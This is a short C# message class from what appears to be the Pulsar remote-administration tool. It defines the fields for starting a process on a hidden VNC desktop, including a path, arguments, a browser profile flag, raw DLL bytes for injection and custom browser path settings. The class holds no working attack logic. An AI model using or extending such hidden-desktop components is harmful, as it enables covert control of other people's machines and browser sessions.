using System;
using MessagePack;
using Pulsar.Common.Messages.Other;

namespace Pulsar.Common.Messages.Monitoring.HVNC
{
    [MessagePackObject]
    public class StartHVNCProcess : IMessage
    {
        [Key(1)]
        public string Path { get; set; }
        [Key(2)]
        public string Arguments { get; set; }
        [Key(3)]
        public bool DontCloneProfile { get; set; }
        [Key(4)]
        public byte[] DllBytes { get; set; }
        [Key(5)]
        public string CustomBrowserPath { get; set; }
        [Key(6)]
        public string CustomSearchPattern { get; set; }
        [Key(7)]
        public string CustomReplacementPath { get; set; }
    }
}